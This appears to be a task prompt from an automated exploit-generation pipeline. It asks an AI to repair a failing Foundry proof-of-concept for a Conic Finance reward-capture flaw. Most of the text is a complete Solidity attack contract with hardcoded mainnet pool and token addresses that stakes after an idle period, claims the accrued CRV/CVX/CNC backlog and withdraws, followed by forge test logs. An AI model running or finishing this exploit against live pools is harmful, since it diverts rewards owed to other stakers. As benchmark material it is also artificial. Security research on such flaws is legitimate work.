You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: First staker after a zero-stake interval can capture all rewards accrued while nobody was staked
- claim: `poolCheckpoint()` computes newly accrued CRV/CVX/CNC against `lastHoldings`, but when `controller.lpTokenStaker().getBalanceForPool(pool)` is zero it skips `_updateEarned()` and therefore does not advance `lastHoldings`. Rewards that accrue during a zero-stake interval remain unassigned and are later distributed across the next non-zero staked supply, letting the first new staker absorb the entire backlog.
- impact: A user can stake a dust amount after an idle period and appropriate all rewards that accumulated while no one was staked. This diverts materially valuable CRV/CVX/CNC from the intended reward flow and creates a permissionless reward-theft/windfall vector.
- exploit_paths: ["All LP staking for a pool drops to zero while the pool's Curve/Convex positions continue accruing rewards.", "No one calls a path that advances `lastHoldings` during the zero-stake interval, so the backlog remains pending.", "An attacker stakes a minimal amount and triggers `accountCheckpoint()` or `claimEarnings()`, causing the full backlog to be distributed over the tiny current staked supply."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH9 is IERC20 {
    function deposit() external payable;
}

interface IConicPool {
    function underlying() external view returns (address);

    function rewardManager() external view returns (address);

    function controller() external view returns (address);

    function deposit(
        uint256 underlyingAmount,
        uint256 minLpReceived,
        bool stake
    ) external returns (uint256);

    function unstakeAndWithdraw(
        uint256 conicLpAmount,
        uint256 minUnderlyingReceived
    ) external returns (uint256);
}

interface IController {
    function lpTokenStaker() external view returns (address);
}

interface ILpTokenStaker {
    function getBalanceForPool(address conicPool) external view returns (uint256);

    function getUserBalanceForPool(
        address conicPool,
        address account
    ) external view returns (uint256);
}

interface IRewardManager {
    function claimableRewards(
        address account
    ) external view returns (uint256 cncRewards, uint256 crvRewards, uint256 cvxRewards);

    function claimEarnings()
        external
        returns (uint256 cncRewards, uint256 crvRewards, uint256 cvxRewards);
}

contract FlawVerifier {
    address internal constant TARGET_POOL = 0xBb787d6243a8D450659E09ea6fD82F1C859691e9;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant CVX = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
    address internal constant CNC = 0x9aE380F0272E2162340a5bB646c354271c0F5cFC;

    uint256 internal constant DEFAULT_ATTACK_CAPITAL = 1 ether;

    address internal _profitTokenAddress;
    uint256 internal _profitAmountValue;

    error WrongUnderlying(address actualUnderlying);
    error ExistingStakeBlocksPath(uint256 totalStaked);
    error NoVerifierCapital();
    error DepositDidNotCreateStake();
    error NoRewardBacklogAfterZeroStake();
    error NoNetProfit();

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _profitTokenAddress = address(0);
        _profitAmountValue = 0;

        IConicPool pool = _pool();
        address underlying = pool.underlying();
        if (underlying != WETH) {
            revert WrongUnderlying(underlying);
        }

        uint256 availableCapital = _prepareDirectCapital();
        _forceApprove(IERC20(WETH), TARGET_POOL, type(uint256).max);

        uint256 capital = availableCapital;
        if (capital > DEFAULT_ATTACK_CAPITAL) {
            capital = DEFAULT_ATTACK_CAPITAL;
        }

        (uint256 cncClaimed, uint256 crvClaimed, uint256 cvxClaimed) = _attackWithCapital(capital);
        _recordProfit(cncClaimed, crvClaimed, cvxClaimed);
    }

    function profitToken() external view returns (address) {
        return _profitTokenAddress;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmountValue;
    }

    function _prepareDirectCapital() internal returns (uint256 capital) {
        capital = IERC20(WETH).balanceOf(address(this));
        if (capital == 0) {
            uint256 ethBalance = address(this).balance;
            if (ethBalance != 0) {
                // Direct execution still uses verifier-held assets first. Wrapping any ETH
                // already sitting on the verifier is a realistic public preparation step
                // for entering this WETH-denominated pool without altering exploit causality.
                IWETH9(WETH).deposit{value: ethBalance}();
                capital = IERC20(WETH).balanceOf(address(this));
            }
        }
        if (capital == 0) {
            revert NoVerifierCapital();
        }
    }

    function _attackWithCapital(
        uint256 capital
    ) internal returns (uint256 cncClaimed, uint256 crvClaimed, uint256 cvxClaimed) {
        ILpTokenStaker staker = _staker();
        IRewardManager rewardManager = _rewardManager();

        uint256 totalStakedBefore = staker.getBalanceForPool(TARGET_POOL);
        if (totalStakedBefore != 0) {
            revert ExistingStakeBlocksPath(totalStakedBefore);
        }

        // Exploit paths 1 and 2: after rewards accrue while nobody is staked and
        // `lastHoldings` stays stale, the attacker becomes the first new staker with
        // verifier-held dust capital.
        _pool().deposit(capital, 0, true);

        uint256 attackerStake = staker.getUserBalanceForPool(TARGET_POOL, address(this));
        if (attackerStake == 0) {
            revert DepositDidNotCreateStake();
        }

        // Exploit path 3: the first post-idle account checkpoint is reached through
        // `claimEarnings()`, which internally runs `poolCheckpoint()` and distributes the
        // entire backlog across the tiny current stake.
        (uint256 cncBacklog, uint256 crvBacklog, uint256 cvxBacklog) = rewardManager.claimableRewards(
            address(this)
        );
        if (cncBacklog == 0 && crvBacklog == 0 && cvxBacklog == 0) {
            revert NoRewardBacklogAfterZeroStake();
        }

        (cncClaimed, crvClaimed, cvxClaimed) = rewardManager.claimEarnings();
        _pool().unstakeAndWithdraw(attackerStake, 0);
    }

    function _recordProfit(uint256 cncClaimed, uint256 crvClaimed, uint256 cvxClaimed) internal {
        if (cncClaimed != 0) {
            _profitTokenAddress = CNC;
            _profitAmountValue = cncClaimed;
            return;
        }
        if (crvClaimed != 0) {
            _profitTokenAddress = CRV;
            _profitAmountValue = crvClaimed;
            return;
        }
        if (cvxClaimed != 0) {
            _profitTokenAddress = CVX;
            _profitAmountValue = cvxClaimed;
            return;
        }

        revert NoNetProfit();
    }

    function _pool() internal pure returns (IConicPool) {
        return IConicPool(TARGET_POOL);
    }

    function _rewardManager() internal view returns (IRewardManager) {
        return IRewardManager(_pool().rewardManager());
    }

    function _staker() internal view returns (ILpTokenStaker) {
        return ILpTokenStaker(IController(_pool().controller()).lpTokenStaker());
    }

    function _forceApprove(IERC20 token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.approve.selector, spender, amount)
        );
        if (_didSucceed(ok, data)) {
            return;
        }

        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, amount));
    }

    function _callOptionalReturn(IERC20 token, bytes memory data) internal {
        (bool ok, bytes memory returndata) = address(token).call(data);
        require(_didSucceed(ok, returndata), "TOKEN_CALL_FAILED");
    }

    function _didSucceed(bool ok, bytes memory returndata) internal pure returns (bool) {
        return ok && (returndata.length == 0 || abi.decode(returndata, (bool)));
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.88s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 20156)
Traces:
  [20156] FlawVerifierTest::testExploit()
    ├─ [2307] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [11367] FlawVerifier::executeOnOpportunity()
    │   ├─ [283] 0xBb787d6243a8D450659E09ea6fD82F1C859691e9::underlying() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Revert] NoVerifierCapital()
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 81.68ms (1.40ms CPU time)

Ran 1 test suite in 116.15ms (81.68ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 20156)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
